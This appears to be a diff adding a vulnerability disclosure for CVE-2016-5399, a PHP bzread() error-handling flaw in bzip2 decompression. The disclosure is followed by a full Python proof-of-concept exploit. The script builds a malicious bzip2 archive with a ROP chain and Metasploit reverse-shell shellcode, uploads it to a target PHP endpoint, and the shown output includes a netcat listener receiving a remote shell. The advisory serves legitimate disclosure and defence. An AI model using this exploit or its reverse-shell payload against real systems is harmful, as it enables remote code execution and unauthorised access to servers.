@@ -1,0 +1,533 @@
+'''
+PHP 7.0.8, 5.6.23 and 5.5.37 does not perform adequate error handling in
+its `bzread()' function:
+
+php-7.0.8/ext/bz2/bz2.c
+,----
+| 364 static PHP_FUNCTION(bzread)
+| 365 {
+| ...
+| 382     ZSTR_LEN(data) = php_stream_read(stream, ZSTR_VAL(data), ZSTR_LEN(data));
+| 383     ZSTR_VAL(data)[ZSTR_LEN(data)] = '\0';
+| 384
+| 385     RETURN_NEW_STR(data);
+| 386 }
+`----
+
+php-7.0.8/ext/bz2/bz2.c
+,----
+| 210 php_stream_ops php_stream_bz2io_ops = {
+| 211     php_bz2iop_write, php_bz2iop_read,
+| 212     php_bz2iop_close, php_bz2iop_flush,
+| 213     "BZip2",
+| 214     NULL, /* seek */
+| 215     NULL, /* cast */
+| 216     NULL, /* stat */
+| 217     NULL  /* set_option */
+| 218 };
+`----
+
+php-7.0.8/ext/bz2/bz2.c
+,----
+| 136 /* {{{ BZip2 stream implementation */
+| 137
+| 138 static size_t php_bz2iop_read(php_stream *stream, char *buf, size_t count)
+| 139 {
+| 140     struct php_bz2_stream_data_t *self = (struct php_bz2_stream_data_t *)stream->abstract;
+| 141     size_t ret = 0;
+| 142
+| 143     do {
+| 144         int just_read;
+| ...
+| 148         just_read = BZ2_bzread(self->bz_file, buf, to_read);
+| 149
+| 150         if (just_read < 1) {
+| 151             stream->eof = 0 == just_read;
+| 152             break;
+| 153         }
+| 154
+| 155         ret += just_read;
+| 156     } while (ret < count);
+| 157
+| 158     return ret;
+| 159 }
+`----
+
+The erroneous return values for Bzip2 are as follows:
+
+bzip2-1.0.6/bzlib.h
+,----
+| 038 #define BZ_SEQUENCE_ERROR    (-1)
+| 039 #define BZ_PARAM_ERROR       (-2)
+| 040 #define BZ_MEM_ERROR         (-3)
+| 041 #define BZ_DATA_ERROR        (-4)
+| 042 #define BZ_DATA_ERROR_MAGIC  (-5)
+| 043 #define BZ_IO_ERROR          (-6)
+| 044 #define BZ_UNEXPECTED_EOF    (-7)
+| 045 #define BZ_OUTBUFF_FULL      (-8)
+| 046 #define BZ_CONFIG_ERROR      (-9)
+`----
+
+Should the invocation of BZ2_bzread() fail, the loop would simply be
+broken out of (bz2.c:152) and execution would continue with bzread()
+returning RETURN_NEW_STR(data).
+
+According to the manual [1], bzread() returns FALSE on error; however
+that does not seem to ever happen.
+
+Due to the way that the bzip2 library deals with state, this could
+result in an exploitable condition if a user were to call bzread() after
+an error, eg:
+
+,----
+| $data = "";
+| while (!feof($fp)) {
+|     $res = bzread($fp);
+|     if ($res === FALSE) {
+|         exit("ERROR: bzread()");
+|     }
+|     $data .= $res;
+| }
+`----
+
+
+Exploitation
+============
+
+One way the lack of error-checking could be abused is through
+out-of-bound writes that may occur when `BZ2_decompress()' (BZ2_bzread()
+-> BZ2_bzRead() -> BZ2_bzDecompress() -> BZ2_decompress()) processes the
+`pos' array using user-controlled selectors as indices:
+
+bzip2-1.0.6/decompress.c
+,----
+| 106 Int32 BZ2_decompress ( DState* s )
+| 107 {
+| 108    UChar      uc;
+| 109    Int32      retVal;
+| ...
+| 113    /* stuff that needs to be saved/restored */
+| 114    Int32  i;
+| 115    Int32  j;
+| ...
+| 118    Int32  nGroups;
+| 119    Int32  nSelectors;
+| ...
+| 167    /*restore from the save area*/
+| 168    i           = s->save_i;
+| 169    j           = s->save_j;
+| ...
+| 172    nGroups     = s->save_nGroups;
+| 173    nSelectors  = s->save_nSelectors;
+| ...
+| 195    switch (s->state) {
+| ...
+| 286       /*--- Now the selectors ---*/
+| 287       GET_BITS(BZ_X_SELECTOR_1, nGroups, 3);
+| 288       if (nGroups < 2 || nGroups > 6) RETURN(BZ_DATA_ERROR);
+| 289       GET_BITS(BZ_X_SELECTOR_2, nSelectors, 15);
+| 290       if (nSelectors < 1) RETURN(BZ_DATA_ERROR);
+| 291       for (i = 0; i < nSelectors; i++) {
+| 292          j = 0;
+| 293          while (True) {
+| 294             GET_BIT(BZ_X_SELECTOR_3, uc);
+| 295             if (uc == 0) break;
+| 296             j++;
+| 297             if (j >= nGroups) RETURN(BZ_DATA_ERROR);
+| 298          }
+| 299          s->selectorMtf[i] = j;
+| 300       }
+| 301
+| 302       /*--- Undo the MTF values for the selectors. ---*/
+| 303       {
+| 304          UChar pos[BZ_N_GROUPS], tmp, v;
+| 305          for (v = 0; v < nGroups; v++) pos[v] = v;
+| 306
+| 307          for (i = 0; i < nSelectors; i++) {
+| 308             v = s->selectorMtf[i];
+| 309             tmp = pos[v];
+| 310             while (v > 0) { pos[v] = pos[v-1]; v--; }
+| 311             pos[0] = tmp;
+| 312             s->selector[i] = tmp;
+| 313          }
+| 314       }
+| 315
+| ...
+| 613    save_state_and_return:
+| 614
+| 615    s->save_i           = i;
+| 616    s->save_j           = j;
+| ...
+| 619    s->save_nGroups     = nGroups;
+| 620    s->save_nSelectors  = nSelectors;
+| ...
+| 640    return retVal;
+| 641 }
+`----
+
+bzip2-1.0.6/decompress.c
+,----
+| 070 #define GET_BIT(lll,uuu)                          \
+| 071    GET_BITS(lll,uuu,1)
+`----
+
+bzip2-1.0.6/decompress.c
+,----
+| 043 #define GET_BITS(lll,vvv,nnn)                     \
+| 044    case lll: s->state = lll;                      \
+| 045    while (True) {                                 \
+| ...
+| 065    }
+`----
+
+If j >= nGroups (decompress.c:297), BZ2_decompress() would save its
+state and return BZ_DATA_ERROR.  If the caller don't act on the
+erroneous retval, but rather invokes BZ2_decompress() again, the saved
+state would be restored (including `i' and `j') and the switch statement
+would transfer execution to the BZ_X_SELECTOR_3 case -- ie. the
+preceding initialization of `i = 0' and `j = 0' would not be executed.
+
+In pseudocode it could be read as something like:
+
+,----
+| i = s->save_i;
+| j = s->save_j;
+| 
+| switch (s->state) {
+| case BZ_X_SELECTOR_2:
+|     s->state = BZ_X_SELECTOR_2;
+| 
+|     nSelectors = get_15_bits...
+| 
+|     for (i = 0; i < nSelectors; i++) {
+|         j = 0;
+|         while (True) {
+|             goto iter;
+| case BZ_X_SELECTOR_3:
+| iter:
+|     s->state = BZ_X_SELECTOR_3;
+| 
+|     uc = get_1_bit...
+| 
+|     if (uc == 0) goto done;
+|     j++;
+|     if (j >= nGroups) {
+|         retVal = BZ_DATA_ERROR;
+|         goto save_state_and_return;
+|     }
+|     goto iter;
+| done:
+|     s->selectorMtf[i] = j;
+`----
+
+An example selector with nGroup=6:
+,----
+| 11111111111110
+| ||||| `|||||| `- goto done; s->selectorMtf[i] = 13;
+|  `´     j++;
+| j++;    goto save_state_and_return;
+| goto iter;
+`----
+
+Since the selectors are used as indices to `pos' in the subsequent loop,
+an `nSelectors' amount of <= 255 - BZ_N_GROUPS bytes out-of-bound writes
+could occur if BZ2_decompress() is invoked in spite of a previous error.
+
+bzip2-1.0.6/decompress.c
+,----
+| 304          UChar pos[BZ_N_GROUPS], tmp, v;
+| 305          for (v = 0; v < nGroups; v++) pos[v] = v;
+| 306
+| 307          for (i = 0; i < nSelectors; i++) {
+| 308             v = s->selectorMtf[i];
+| 309             tmp = pos[v];
+| 310             while (v > 0) { pos[v] = pos[v-1]; v--; }
+| 311             pos[0] = tmp;
+| 312             s->selector[i] = tmp;
+| 313          }
+`----
+
+bzip2-1.0.6/bzlib_private.h
+,----
+| 121 #define BZ_N_GROUPS 6
+`----
+
+
+PoC
+===
+
+Against FreeBSD 10.3 amd64 with php-fpm 7.0.8 and nginx from the
+official repo [2]:
+
+,----
+| $ nc -v -l 1.2.3.4 5555 &
+| Listening on [1.2.3.4] (family 0, port 5555)
+| 
+| $ python exploit.py --ip 1.2.3.4 --port 5555 http://target/upload.php
+| [*] sending archive to http://target/upload.php (0)
+| 
+| Connection from [target] port 5555 [tcp/*] accepted (family 2, sport 49479)
+| $ fg
+| id
+| uid=80(www) gid=80(www) groups=80(www)
+| 
+| uname -imrsU
+| FreeBSD 10.3-RELEASE-p4 amd64 GENERIC 1003000
+| 
+| /usr/sbin/pkg query -g "=> %n-%v" php*
+| => php70-7.0.8
+| => php70-bz2-7.0.8
+| 
+| cat upload.php
+| <?php
+| $fp = bzopen($_FILES["file"]["tmp_name"], "r");
+| if ($fp === FALSE) {
+|     exit("ERROR: bzopen()");
+| }
+| 
+| $data = "";
+| while (!feof($fp)) {
+|     $res = bzread($fp);
+|     if ($res === FALSE) {
+|         exit("ERROR: bzread()");
+|     }
+|     $data .= $res;
+| }
+| bzclose($fp);
+| ?>
+`----
+
+
+Solution
+========
+
+This issue has been assigned CVE-2016-5399 and can be mitigated by
+calling bzerror() on the handle between invocations of bzip2.
+
+Another partial solution has been introduced in PHP 7.0.9 and 5.5.38,
+whereby the stream is marked as EOF when an error is encountered;
+allowing this flaw to be avoided by using feof().  However, the PHP
+project considers this to be an issue in the underlying bzip2
+library[3].
+
+
+
+Footnotes
+_________
+
+[1] [https://secure.php.net/manual/en/function.bzread.php]
+
+[2] [https://github.com/dyntopia/exploits/tree/master/CVE-2016-5399]
+
+[3] [https://bugs.php.net/bug.php?id=72613]
+
+
+-- Hans Jerry Illikainen
+'''
+#!/usr/bin/env python
+#
+# PoC for CVE-2016-5399 targeting FreeBSD 10.3 x86-64 running php-fpm
+# behind nginx.
+#
+# ,----
+# | $ nc -v -l 1.2.3.4 5555 &
+# | Listening on [1.2.3.4] (family 0, port 5555)
+# |
+# | $ python exploit.py --ip 1.2.3.4 --port 5555 http://target/upload.php
+# | [*] sending archive to http://target/upload.php (0)
+# |
+# | Connection from [target] port 5555 [tcp/*] accepted (family 2, sport 49479)
+# | $ fg
+# | id
+# | uid=80(www) gid=80(www) groups=80(www)
+# |
+# | uname -imrsU
+# | FreeBSD 10.3-RELEASE-p4 amd64 GENERIC 1003000
+# |
+# | /usr/sbin/pkg query -g "=> %n-%v" php*
+# | => php70-7.0.8
+# | => php70-bz2-7.0.8
+# |
+# | cat upload.php
+# | <?php
+# | $fp = bzopen($_FILES["file"]["tmp_name"], "r");
+# | if ($fp === FALSE) {
+# |     exit("ERROR: bzopen()");
+# | }
+# |
+# | $data = "";
+# | while (!feof($fp)) {
+# |     $res = bzread($fp);
+# |     if ($res === FALSE) {
+# |         exit("ERROR: bzread()");
+# |     }
+# |     $data .= $res;
+# | }
+# | bzclose($fp);
+# | ?>
+# `----
+#
+# - Hans Jerry Illikainen <hji@dyntopia.com>
+#
+import argparse
+import socket
+from struct import pack
+
+import requests
+import bitstring
+
+# reverse shell from metasploit
+shellcode = [
+    "\x31\xc0\x83\xc0\x61\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f"
+    "\x05\x49\x89\xc4\x48\x89\xc7\x31\xc0\x83\xc0\x62\x48\x31\xf6"
+    "\x56\x48\xbe\x00\x02%(port)s%(ip)s\x56\x48\x89\xe6\x6a\x10"
+    "\x5a\x0f\x05\x4c\x89\xe7\x6a\x03\x5e\x48\xff\xce\x6a\x5a\x58"
+    "\x0f\x05\x75\xf6\x31\xc0\x83\xc0\x3b\xe8\x08\x00\x00\x00\x2f"
+    "\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c\x24\x48\x31\xd2\x52"
+    "\x57\x48\x89\xe6\x0f\x05"
+]
+
+# we're bound by the MTF and can only reuse values on the stack
+# between pos[0]..pos[255]
+selectors = [
+    # retaddr:
+    #   0x8009c9462: lea    rsp,[rbp-0x20]
+    #   0x8009c9466: pop    rbx
+    #   0x8009c9467: pop    r12
+    #   0x8009c9469: pop    r14
+    #   0x8009c946b: pop    r15
+    #   0x8009c946d: pop    rbp
+    #   0x8009c946e: ret
+    #
+    # from /libexec/ld-elf.so.1 (bbdffba2dc3bb0b325c6eee9d6e5bd01141d97f3)
+    9, 10, 11, 18, 1, 88, 31, 127,
+
+    # rbp:
+    #   0x802974300 (close to the end of the stream)
+    16, 17, 18, 29, 22, 152, 159, 25,
+
+    # push it back
+    17, 18, 19, 20, 21, 22, 23, 24,
+    25, 26, 27, 28, 29, 30, 31, 32,
+    33, 34, 35, 36, 37, 38, 39, 40,
+    41, 42, 43, 44, 45, 46, 47, 48,
+    49, 50, 51, 52, 53, 54, 55, 56,
+    57, 58, 59, 60, 61, 62
+]
+
+payload = [
+    # addr
+    #
+    # 0x41c4c8: pop    rdi
+    # 0x41c4c9: ret
+    pack("<Q", 0x41c4c8),
+    pack("<Q", 0x0802973000),
+
+    # len
+    #
+    # 0x421508: pop    rsi
+    # 0x421509: ret    0x0
+    pack("<Q", 0x421508),
+    pack("<Q", 0x5555),
+
+    # prot
+    #
+    # 0x519b3a: pop    rdx
+    # 0x519b3b: ret
+    pack("<Q", 0x519b3a),
+    pack("<Q", 0x7),
+
+    # mprotect
+    #
+    # 0x5adf50: pop    rax
+    # 0x5adf51: ret
+    pack("<Q", 0x5adf50),
+    pack("<Q", 74),
+
+    # from /libexec/ld-elf.so.1 (bbdffba2dc3bb0b325c6eee9d6e5bd01141d97f3)
+    #
+    # 0x8009d5168: syscall
+    # 0x8009d516a: jb 0x8009d9d00
+    # 0x8009d5170: ret
+    pack("<Q", 0x08009d5168),
+    pack("<Q", 0x08029731b7),
+
+    "%(shellcode)s",
+
+    "%(pad)s",
+
+    # 0x45de9c: pop rsp
+    # 0x45de9d: ret
+    pack("<Q", 0x45de9c),
+    pack("<Q", 0x0802973167),
+]
+
+
+def get_payload(ip, port):
+    sc = "".join(shellcode) % {
+        "ip": socket.inet_aton(ip),
+        "port": pack("!H", port)
+    }
+    return "".join(payload) % {
+        "shellcode": sc,
+        "pad": "\x90" * (4433 - len(sc)),
+    }
+
+
+def get_header():
+    b = bitstring.BitArray()
+    b.append("0x425a")             # magic
+    b.append("0x68")               # huffman
+    b.append("0x31")               # block size (0x31 <= s <= 0x39)
+    b.append("0x314159265359")     # compressed magic
+    b.append("0x11223344")         # crc
+    b.append("0b0")                # not randomized
+    b.append("0x000000")           # pointer into BWT
+    b.append("0b0000000000000001") # mapping table 1
+    b.append("0b0000000000000001") # mapping table 2
+    b.append("0b110")              # number of Huffman groups (1 <= n <= 6)
+    b.append(format(len(selectors), "#017b")) # number of selectors
+
+    # selector list
+    for s in selectors:
+        b.append("0b" + "1" * s + "0")
+
+    # BZ_X_CODING_1 (1 <= n <= 20).  we want a fail to make
+    # BZ2_decompress() bail as early as possible into the
+    # first gadget since the stack will be kind of messed up
+    b.append("0b00000")
+
+    return b.tobytes()
+
+
+def send_bzip2(url, bzip2):
+    try:
+        req = requests.post(url, files={"file": bzip2}, timeout=5)
+    except requests.exceptions.Timeout:
+        return 0
+    return req.status_code
+
+
+def get_args():
+    p = argparse.ArgumentParser()
+    p.add_argument("--ip", required=True, help="connect-back ip")
+    p.add_argument("--port", required=True, type=int, help="connect-back port")
+    p.add_argument("--attempts", type=int, default=10)
+    p.add_argument("url")
+    return p.parse_args()
+
+
+def main():
+    args = get_args()
+    bzip2 = get_header() + get_payload(args.ip, args.port)
+
+    for i in range(args.attempts):
+        print("[*] sending archive to %s (%d)" % (args.url, i))
+        status = send_bzip2(args.url, bzip2)
+        if status == 0:
+            break
+        elif status == 404:
+            exit("[-] 404: %s" % args.url)
+
+if __name__ == "__main__":
+    main()
